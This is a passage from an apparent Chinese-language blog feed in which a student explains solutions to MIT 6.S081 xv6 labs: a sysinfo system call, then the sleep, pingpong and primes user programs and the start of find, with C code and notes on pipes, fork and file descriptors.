title="思路"></a>思路</h2><ol><li><p>首先可以和第一个任务一样先把sysinfo系统调用的架子给搭起来，然后正式开始写<code>sys_sysinfo</code>函数</p></li><li><p>hints里已经提示我们了，分别需要去另外两个文件里添加函数</p><ol><li><p>在kalloc.c文件中，可以发现空闲页面被存放在kmem的freelist中，这个freelist是一个链表，每一个结点代表一个大小为PGSIZE的空闲页面，我们可以通过next指针找到下一个结点。因此简单地遍历一遍就可以得到空闲的页面数量。</p><p> 除了这个写法，还可以在每次成功调用了kalloc和kfree时更新一个全局变量freepage_num，这样可以避免线性遍历一个链表</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">uint64 <span class="hljs-title function_">get_freemem</span><span class="hljs-params">()</span> &#123;<br>    uint64 ans = <span class="hljs-number">0</span>;<br>    acquire(&amp;kmem.lock);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">run</span> *<span class="hljs-title">p</span> =</span> kmem.freelist;<br>    <span class="hljs-keyword">while</span> (p) &#123;<br>        ans += PGSIZE;<br>        p = p-&gt;next;<br>    &#125;<br>    release(&amp;kmem.lock);<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>在proc.c文件中，看起来代码很多，但是可以发现，所有的进程都是存放在proc数组的，这个数组的元素类型是就是struct proc，因此可以直接访问这个进程的state，代码如下</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">uint64 <span class="hljs-title function_">get_uf_proc</span><span class="hljs-params">()</span> &#123;<br>    uint64 ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">p</span>;</span><br>    <span class="hljs-keyword">for</span> (p = proc; p &lt; &amp;proc[NPROC]; p++) &#123;<br>        acquire(&amp;p-&gt;lock);<br>        <span class="hljs-keyword">if</span> (p-&gt;state != UNUSED) &#123;<br>            ans += <span class="hljs-number">1</span>;<br>        &#125;<br>        release(&amp;p-&gt;lock);<br>    &#125;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>最后就要完成<code>sys_sysinfo</code>函数，这个函数的关键在于copyout函数，在hints里已经给出了一个用法示例，按着这个来就行了。</p><ol><li><p>copyout函数的第一个参数，是用户进程的页表</p></li><li><p>sysinfo函数的参数是一个struct sysinfo类型的指针，它是一个传出参数，也就是copyout函数的第二个参数。在sys_sysinfo函数中，这个参数就在a0寄存器中，可以通过argaddr访问，也可以直接通过a0寄存器访问</p></li><li><p>第三个参数是我们要往第二个参数表示的地址写入的具体内容，其实就是一个struct sysinfo对象，所以创建一个这个对象，然后用上面写好的两个函数初始化这个对象的值。最后将它的地址放在第三个参数上即可</p></li><li><p>最后一个参数就是sizeof(struct sysinfo)</p></li></ol><p> 代码如下</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">uint64<br><span class="hljs-title function_">sys_sysinfo</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sysinfo</span> <span class="hljs-title">ans</span>;</span><br>    ans.freemem = get_freemem();<br>    ans.nproc = get_uf_proc();<br>    uint64 desaddr;<br>    argaddr(<span class="hljs-number">0</span>, &amp;desaddr);<br>    <span class="hljs-keyword">if</span> (copyout(myproc()-&gt;pagetable, desaddr, (<span class="hljs-type">char</span> *)(&amp;ans), <span class="hljs-keyword">sizeof</span>(ans)) &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol></li></ol>]]></content>
    
    
    <categories>
      
      <category>Operating System</category>
      
      <category>MIT6.S081</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Operating System</tag>
      
      <tag>MIT6.S081</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>6.s081_lab1</title>
    <link href="/2023/08/12/6-s081-lab1/"/>
    <url>/2023/08/12/6-s081-lab1/</url>
    
    <content type="html"><![CDATA[<p><img src="http://woaixiaoxiao-image.oss-cn-beijing.aliyuncs.com/img/20231224203558.png" alt="20231224203558"></p><h1 id="测试和运行"><a href="#测试和运行" class="headerlink" title="测试和运行"></a>测试和运行</h1><h2 id="参考大佬1-修改grade-lab-util文件中的python为python32-xv6-out这个文件的所有者可能是root，需要修改为用户，sudo-chown-woaixiaoxiao-xv6-out每完成一个函数，执行下面的步骤1-在Makefile中加入新增的程序-U-sleep-2-make-qemu，顺便可以自测一下命令是否有效3-grade-lab-util-sleep-sleep"><a href="#参考大佬1-修改grade-lab-util文件中的python为python32-xv6-out这个文件的所有者可能是root，需要修改为用户，sudo-chown-woaixiaoxiao-xv6-out每完成一个函数，执行下面的步骤1-在Makefile中加入新增的程序-U-sleep-2-make-qemu，顺便可以自测一下命令是否有效3-grade-lab-util-sleep-sleep" class="headerlink" title="参考大佬1. 修改grade-lab-util文件中的python为python32. xv6.out这个文件的所有者可能是root，需要修改为用户，sudo chown woaixiaoxiao xv6.out每完成一个函数，执行下面的步骤1. 在Makefile中加入新增的程序$U/_sleep\2. make qemu，顺便可以自测一下命令是否有效3. ./grade-lab-util sleep# sleep"></a><a href="http://doraemonzzz.com/2021/07/20/2021-7-20-MIT-6.S081-Operating-System-Enginerring-Lab1-Utilities/">参考大佬</a><br>1. 修改<code>grade-lab-util</code>文件中的python为python3<br>2. xv6.out这个文件的所有者可能是root，需要修改为用户，<code>sudo chown woaixiaoxiao xv6.out</code><br>每完成一个函数，执行下面的步骤<br>1. 在Makefile中加入新增的程序<code>$U/_sleep\</code><br>2. <code>make qemu</code>，顺便可以自测一下命令是否有效<br>3. <code>./grade-lab-util sleep</code><br># sleep</h2><h2 id="要求1-为xv6实现sleep函数，用户可以指定暂停多少个tick2-在user-sleep-c中实现，这个文件要自己创建"><a href="#要求1-为xv6实现sleep函数，用户可以指定暂停多少个tick2-在user-sleep-c中实现，这个文件要自己创建" class="headerlink" title="要求1. 为xv6实现sleep函数，用户可以指定暂停多少个tick2. 在user/sleep.c中实现，这个文件要自己创建"></a>要求<br>1. 为<code>xv6</code>实现<code>sleep</code>函数，用户可以指定暂停多少个tick<br>2. 在<code>user/sleep.c</code>中实现，这个文件要自己创建</h2><h2 id="思路1-首先根据argc和argv判断指令是否输入正确，并提取出sleep的tick数量2-然后使用系统调用sleep函数-1-这里我一开始很疑惑，既然都有了一个sleep系统调用了，干嘛还要我们自己实现一个。-2-并且我发现只需要引用user-user-h头文件就可以使用这个系统调用，但是我没有发现user-user-c文件，目前我还看不太懂这个系统调用是如何实现的。-3-看了一些博客后，发现后面会讲，所以现在就把这些系统调用当做黑盒子来用就行了。-4-系统调用必须通过程序来使用的，也就是说就算我们有了sleep系统调用，但是我们依然需要写一个比如说c语言程序sleep来调用这个系统调用"><a href="#思路1-首先根据argc和argv判断指令是否输入正确，并提取出sleep的tick数量2-然后使用系统调用sleep函数-1-这里我一开始很疑惑，既然都有了一个sleep系统调用了，干嘛还要我们自己实现一个。-2-并且我发现只需要引用user-user-h头文件就可以使用这个系统调用，但是我没有发现user-user-c文件，目前我还看不太懂这个系统调用是如何实现的。-3-看了一些博客后，发现后面会讲，所以现在就把这些系统调用当做黑盒子来用就行了。-4-系统调用必须通过程序来使用的，也就是说就算我们有了sleep系统调用，但是我们依然需要写一个比如说c语言程序sleep来调用这个系统调用" class="headerlink" title="思路1. 首先根据argc和argv判断指令是否输入正确，并提取出sleep的tick数量2. 然后使用系统调用sleep函数    1. 这里我一开始很疑惑，既然都有了一个sleep系统调用了，干嘛还要我们自己实现一个。    2. 并且我发现只需要引用user/user.h头文件就可以使用这个系统调用，但是我没有发现user/user.c文件，目前我还看不太懂这个系统调用是如何实现的。    3. 看了一些博客后，发现后面会讲，所以现在就把这些系统调用当做黑盒子来用就行了。    4. 系统调用必须通过程序来使用的，也就是说就算我们有了sleep系统调用，但是我们依然需要写一个比如说c语言程序sleep来调用这个系统调用"></a>思路<br>1. 首先根据argc和argv判断指令是否输入正确，并提取出sleep的tick数量<br>2. 然后使用系统调用<code>sleep</code>函数<br>    1. 这里我一开始很疑惑，既然都有了一个sleep系统调用了，干嘛还要我们自己实现一个。<br>    2. 并且我发现只需要引用<code>user/user.h</code>头文件就可以使用这个系统调用，但是我没有发现<code>user/user.c</code>文件，目前我还看不太懂这个系统调用是如何实现的。<br>    3. 看了一些博客后，发现后面会讲，所以现在就把这些系统调用当做黑盒子来用就行了。<br>    4. 系统调用必须通过程序来使用的，也就是说就算我们有了sleep系统调用，但是我们依然需要写一个比如说c语言程序sleep来调用这个系统调用</h2><h2 id="注意点1-头文件的顺序是有讲究的，因为user-h中使用了types-h中定义的变量，因此必须也包含types-h并且需要放到user-h前面"><a href="#注意点1-头文件的顺序是有讲究的，因为user-h中使用了types-h中定义的变量，因此必须也包含types-h并且需要放到user-h前面" class="headerlink" title="注意点1. 头文件的顺序是有讲究的，因为user.h中使用了types.h中定义的变量，因此必须也包含types.h并且需要放到user.h前面"></a>注意点<br>1. 头文件的顺序是有讲究的，因为user.h中使用了types.h中定义的变量，因此必须也包含types.h并且需要放到user.h前面</h2><h2 id="代码实现-pingpong"><a href="#代码实现-pingpong" class="headerlink" title="代码实现# pingpong"></a>代码实现<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;kernel/types.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;kernel/stat.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;user/user.h&quot;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span> &#123;<br>    <span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">2</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;usage: sleep time_val...\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-type">int</span> tick = atoi(argv[<span class="hljs-number">1</span>]);<br>    sleep(tick);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><br># pingpong</h2><h2 id="要求1-在父子进程之间利用两个管道进行通信，每个管道负责一个方向2-只需要传输一个字节的数据，父子进程在收到数据后应该打印信息3-顺序上应该父进程先发送，子进程后发送"><a href="#要求1-在父子进程之间利用两个管道进行通信，每个管道负责一个方向2-只需要传输一个字节的数据，父子进程在收到数据后应该打印信息3-顺序上应该父进程先发送，子进程后发送" class="headerlink" title="要求1. 在父子进程之间利用两个管道进行通信，每个管道负责一个方向2. 只需要传输一个字节的数据，父子进程在收到数据后应该打印信息3. 顺序上应该父进程先发送，子进程后发送"></a>要求<br>1. 在父子进程之间利用两个管道进行通信，每个管道负责一个方向<br>2. 只需要传输一个字节的数据，父子进程在收到数据后应该打印信息<br>3. 顺序上应该父进程先发送，子进程后发送</h2><h2 id="思路1-按照题目要求的来就行了，顺序上通过read自带的阻塞就可以让子进程在收到父进程发送数据之后再发给父进程了"><a href="#思路1-按照题目要求的来就行了，顺序上通过read自带的阻塞就可以让子进程在收到父进程发送数据之后再发给父进程了" class="headerlink" title="思路1. 按照题目要求的来就行了，顺序上通过read自带的阻塞就可以让子进程在收到父进程发送数据之后再发给父进程了"></a>思路<br>1. 按照题目要求的来就行了，顺序上通过read自带的阻塞就可以让子进程在收到父进程发送数据之后再发给父进程了</h2><h2 id="注意点1-对于管道，可以看成是已经open的文件，不需要open，直接read和write2-read和write需要给出size，而c语言里的字符串往往是通过一个0来结尾的，那在调用read或者write时的size需要加上这个0吗？答案是不需要，只需要给出有效数据的size。而这个0只需要在我们创建buf数组的时候考虑即可3-可以定义宏来表示0和1，这样在使用管道的时候更加清晰"><a href="#注意点1-对于管道，可以看成是已经open的文件，不需要open，直接read和write2-read和write需要给出size，而c语言里的字符串往往是通过一个0来结尾的，那在调用read或者write时的size需要加上这个0吗？答案是不需要，只需要给出有效数据的size。而这个0只需要在我们创建buf数组的时候考虑即可3-可以定义宏来表示0和1，这样在使用管道的时候更加清晰" class="headerlink" title="注意点1. 对于管道，可以看成是已经open的文件，不需要open，直接read和write2. read和write需要给出size，而c语言里的字符串往往是通过一个0来结尾的，那在调用read或者write时的size需要加上这个0吗？答案是不需要，只需要给出有效数据的size。而这个0只需要在我们创建buf数组的时候考虑即可3. 可以定义宏来表示0和1，这样在使用管道的时候更加清晰"></a>注意点<br>1. 对于管道，可以看成是已经open的文件，不需要open，直接read和write<br>2. read和write需要给出size，而c语言里的字符串往往是通过一个0来结尾的，那在调用read或者write时的size需要加上这个0吗？答案是不需要，只需要给出有效数据的size。而这个0只需要在我们创建buf数组的时候考虑即可<br>3. 可以定义宏来表示0和1，这样在使用管道的时候更加清晰</h2><h2 id="实现-primes"><a href="#实现-primes" class="headerlink" title="实现# primes"></a>实现<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;kernel/types.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;kernel/stat.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;user/user.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIZE 1</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-comment">// p1 父写子读</span><br>  <span class="hljs-type">int</span> p1[<span class="hljs-number">2</span>];<br>  pipe(p1);<br>  <span class="hljs-comment">// p2 子写父读</span><br>  <span class="hljs-type">int</span> p2[<span class="hljs-number">2</span>];<br>  pipe(p2);<br>  <span class="hljs-comment">// 子进程</span><br>  <span class="hljs-keyword">if</span> (fork() == <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-comment">// 子进程阻塞p1的写端，p2的读端</span><br>    close(p1[<span class="hljs-number">1</span>]);<br>    close(p2[<span class="hljs-number">0</span>]);<br>    <span class="hljs-type">char</span> buf[SIZE + <span class="hljs-number">1</span>];<br>    read(p1[<span class="hljs-number">0</span>], buf, SIZE);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d: received ping\n&quot;</span>, getpid());<br>    write(p2[<span class="hljs-number">1</span>], buf, SIZE);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// 父进程</span><br>    close(p1[<span class="hljs-number">0</span>]);<br>    close(p2[<span class="hljs-number">1</span>]);<br>    <span class="hljs-type">char</span> buf[SIZE] = <span class="hljs-string">&quot;1&quot;</span>;<br>    write(p1[<span class="hljs-number">1</span>], buf, SIZE);<br>    read(p2[<span class="hljs-number">0</span>], buf, SIZE);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d: received pong\n&quot;</span>, getpid());<br>  &#125;<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><br># primes</h2><h2 id="题意1-要我们输出35以内的所有质数（实验文档给的参考资料是求1000以内的，但是好像因为xv6资源的限制，搞不了这么多，所以只需要求35以内的）2-需要用到一种很神奇的方法-1-我们会用到很多进程，每个进程之间用一个管道相连接-2-每个进程会收到上一个进程发来的很多数字，其中第一个数字一定是质数，后面的数字有两种情况-1-如果是第一个数字的倍数，那肯定不是质数，不需要管了-2-如果不是第一个数字的倍数，则传给下一个进程，让下一个进程去处理"><a href="#题意1-要我们输出35以内的所有质数（实验文档给的参考资料是求1000以内的，但是好像因为xv6资源的限制，搞不了这么多，所以只需要求35以内的）2-需要用到一种很神奇的方法-1-我们会用到很多进程，每个进程之间用一个管道相连接-2-每个进程会收到上一个进程发来的很多数字，其中第一个数字一定是质数，后面的数字有两种情况-1-如果是第一个数字的倍数，那肯定不是质数，不需要管了-2-如果不是第一个数字的倍数，则传给下一个进程，让下一个进程去处理" class="headerlink" title="题意1. 要我们输出35以内的所有质数（实验文档给的参考资料是求1000以内的，但是好像因为xv6资源的限制，搞不了这么多，所以只需要求35以内的）2. 需要用到一种很神奇的方法    1. 我们会用到很多进程，每个进程之间用一个管道相连接    2. 每个进程会收到上一个进程发来的很多数字，其中第一个数字一定是质数，后面的数字有两种情况        1. 如果是第一个数字的倍数，那肯定不是质数，不需要管了        2. 如果不是第一个数字的倍数，则传给下一个进程，让下一个进程去处理"></a>题意<br>1. 要我们输出35以内的所有质数（实验文档给的参考资料是求1000以内的，但是好像因为xv6资源的限制，搞不了这么多，所以只需要求35以内的）<br>2. 需要用到一种很神奇的方法<br>    1. 我们会用到很多进程，每个进程之间用一个管道相连接<br>    2. 每个进程会收到上一个进程发来的很多数字，其中第一个数字一定是质数，后面的数字有两种情况<br>        1. 如果是第一个数字的倍数，那肯定不是质数，不需要管了<br>        2. 如果不是第一个数字的倍数，则传给下一个进程，让下一个进程去处理</h2><h2 id="思路1-解题的方法以及比较明确了，关键是如何实现这个过程？2-我们最开始只有一个main进程，而我们需要很多的进程，并且这些进程之间是串联的，最重要的是逻辑都一样，所以可以用递归3-这些进程是通过管道进行通信的，那么最简单的方法就是将管道作为递归函数的参数进行传递，这样就把所有的进程给串起来了"><a href="#思路1-解题的方法以及比较明确了，关键是如何实现这个过程？2-我们最开始只有一个main进程，而我们需要很多的进程，并且这些进程之间是串联的，最重要的是逻辑都一样，所以可以用递归3-这些进程是通过管道进行通信的，那么最简单的方法就是将管道作为递归函数的参数进行传递，这样就把所有的进程给串起来了" class="headerlink" title="思路1. 解题的方法以及比较明确了，关键是如何实现这个过程？2. 我们最开始只有一个main进程，而我们需要很多的进程，并且这些进程之间是串联的，最重要的是逻辑都一样，所以可以用递归3. 这些进程是通过管道进行通信的，那么最简单的方法就是将管道作为递归函数的参数进行传递，这样就把所有的进程给串起来了"></a>思路<br>1. 解题的方法以及比较明确了，关键是如何实现这个过程？<br>2. 我们最开始只有一个main进程，而我们需要很多的进程，并且这些进程之间是串联的，最重要的是逻辑都一样，所以可以用递归<br>3. 这些进程是通过管道进行通信的，那么最简单的方法就是将管道作为递归函数的参数进行传递，这样就把所有的进程给串起来了</h2><h2 id="注意点1-因为xv6的文件描述符是有限的，所以我们最好在能够关闭管道的时候都给它关了2-在我的实现中，递归程序很早的就fork了，但是因为在fork之前先执行了一个read操作，因此，不会导致无限增殖，一个进程想要fork，起码也需要它获得了一个值"><a href="#注意点1-因为xv6的文件描述符是有限的，所以我们最好在能够关闭管道的时候都给它关了2-在我的实现中，递归程序很早的就fork了，但是因为在fork之前先执行了一个read操作，因此，不会导致无限增殖，一个进程想要fork，起码也需要它获得了一个值" class="headerlink" title="注意点1. 因为xv6的文件描述符是有限的，所以我们最好在能够关闭管道的时候都给它关了2. 在我的实现中，递归程序很早的就fork了，但是因为在fork之前先执行了一个read操作，因此，不会导致无限增殖，一个进程想要fork，起码也需要它获得了一个值"></a>注意点<br>1. 因为xv6的文件描述符是有限的，所以我们最好在能够关闭管道的时候都给它关了<br>2. 在我的实现中，递归程序很早的就fork了，但是因为在fork之前先执行了一个read操作，因此，不会导致无限增殖，一个进程想要fork，起码也需要它获得了一个值</h2><p>代码实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;kernel/types.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;kernel/stat.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;user/user.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INT_SIZE 4</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> RD 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> WR 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NULL 0</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">recursion</span><span class="hljs-params">(<span class="hljs-type">int</span> p[])</span> &#123;<br>  <span class="hljs-comment">// 首先关闭写端</span><br>  close(p[WR]);<br>  <span class="hljs-comment">// 读取base数字</span><br>  <span class="hljs-type">int</span> base;<br>  <span class="hljs-type">int</span> temp = read(p[RD], &amp;base, INT_SIZE);<br>  <span class="hljs-comment">// 压根没有输入到这个进程</span><br>  <span class="hljs-keyword">if</span> (temp == <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;prime %d\n&quot;</span>, base);<br>  <span class="hljs-comment">// 创建管道，并和子进程联动</span><br>  <span class="hljs-type">int</span> p2[<span class="hljs-number">2</span>];<br>  pipe(p2);<br>  <span class="hljs-keyword">if</span> (fork() == <span class="hljs-number">0</span>) &#123;<br>    recursion(p2);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-comment">// 关闭读端</span><br>  close(p2[RD]);<br>  <span class="hljs-comment">// 开始不断接受父进程的输入，判断之后传递给子进程</span><br>  <span class="hljs-type">int</span> rec, res;<br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>    res = read(p[RD], &amp;rec, INT_SIZE);<br>    <span class="hljs-comment">// 父进程结束写了</span><br>    <span class="hljs-keyword">if</span> (res == <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-comment">// 如果这个数字不是base的倍数，那么写给子进程</span><br>    <span class="hljs-keyword">if</span> (rec % base != <span class="hljs-number">0</span>) &#123;<br>      write(p2[WR], &amp;rec, INT_SIZE);<br>    &#125;<br>  &#125;<br>  <span class="hljs-comment">// 写完了，关闭自己的写端</span><br>  close(p2[WR]);<br>  <span class="hljs-comment">// 关闭父进程给的管道的读端</span><br>  close(p[RD]);<br>  wait(<span class="hljs-literal">NULL</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br><br>  <span class="hljs-type">int</span> p[<span class="hljs-number">2</span>];<br>  pipe(p);<br>  <span class="hljs-comment">// 子进程</span><br>  <span class="hljs-keyword">if</span> (fork() == <span class="hljs-number">0</span>) &#123;<br>    recursion(p);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-comment">// 父进程</span><br>  close(p[RD]);<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>;i &lt;= <span class="hljs-number">35</span>;i++) &#123;<br>    write(p[WR], &amp;i, INT_SIZE);<br>  &#125;<br>  close(p[WR]);<br>  <span class="hljs-comment">// 等待子进程结束</span><br>  wait(<span class="hljs-literal">NULL</span>);<br><br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="find"><a href="#find" class="headerlink" title="find"></a>find</h1><hr><h2 id="题意1-实现find指令，find-dir-filename的作用是找到dir目录中（包括所有子目录中），所有文件名为filename的文件2-因此，我们要做的就是取出dir目录的每一项，如果是文件，那就比较这个文件的名称，如果是目录，那我们就递归进去"><a href="#题意1-实现find指令，find-dir-filename的作用是找到dir目录中（包括所有子目录中），所有文件名为filename的文件2-因此，我们要做的就是取出dir目录的每一项，如果是文件，那就比较这个文件的名称，如果是目录，那我们就递归进去" class="headerlink" title="题意1. 实现find指令，find dir filename的作用是找到dir目录中（包括所有子目录中），所有文件名为filename的文件2. 因此，我们要做的就是取出dir目录的每一项，如果是文件，那就比较这个文件的名称，如果是目录，那我们就递归进去"></a>题意<br>1. 实现<code>find</code>指令，<code>find dir filename</code>的作用是找到dir目录中（包括所有子目录中），所有文件名为filename的文件<br>2. 因此，我们要做的就是取出dir目录的每一项，如果是文件，那就比较这个文件的名称，如果是目录，那我们就递归进去</h2><h2 id="思路1-hints里提示我们去看ls-c文件是如何访问目录的-1-首先，我们需要根据目录的路径打开目录。目录也是一个文件，所以方法和打开普通的文件一样，并且得到一个文件描述符-2-通过文件描述符去read，但是这个时候要用dirent这个结构去读取每一个目录项-3-通过dirent的name以及当前目录的path，可以构造出这个目录项的path-4-通过这个目录项的path和stat函数，可以把这个目录项的信息给读到stat结构中-5-通过stat结构体的type可以区分目录和文件-1-文件则直接比较名字-2-目录如果不是-和-，那就递归进去"><a href="#思路1-hints里提示我们去看ls-c文件是如何访问目录的-1-首先，我们需要根据目录的路径打开目录。目录也是一个文件，所以方法和打开普通的文件一样，并且得到一个文件描述符-2-通过文件描述符去read，但是这个时候要用dirent这个结构去读取每一个目录项-3-通过dirent的name以及当前目录的path，可以构造出这个目录项的path-4-通过这个目录项的path和stat函数，可以把这个目录项的信息给读到stat结构中-5-通过stat结构体的type可以区分目录和文件-1-文件则直接比较名字-2-目录如果不是-和-，那就递归进去" class="headerlink" title="思路1. hints里提示我们去看ls.c文件是如何访问目录的    1. 首先，我们需要根据目录的路径打开目录。目录也是一个文件，所以方法和打开普通的文件一样，并且得到一个文件描述符    2. 通过文件描述符去read，但是这个时候要用dirent这个结构去读取每一个目录项    3. 通过dirent的name以及当前目录的path，可以构造出这个目录项的path    4. 通过这个目录项的path和stat函数，可以把这个目录项的信息给读到stat结构中    5. 通过stat结构体的type可以区分目录和文件        1. 文件则直接比较名字        2. 目录如果不是.和..，那就递归进去"></a>思路<br>1. hints里提示我们去看<code>ls.c</code>文件是如何访问目录的<br>    1. 首先，我们需要根据目录的路径打开目录。目录也是一个文件，所以方法和打开普通的文件一样，并且得到一个文件描述符<br>    2. 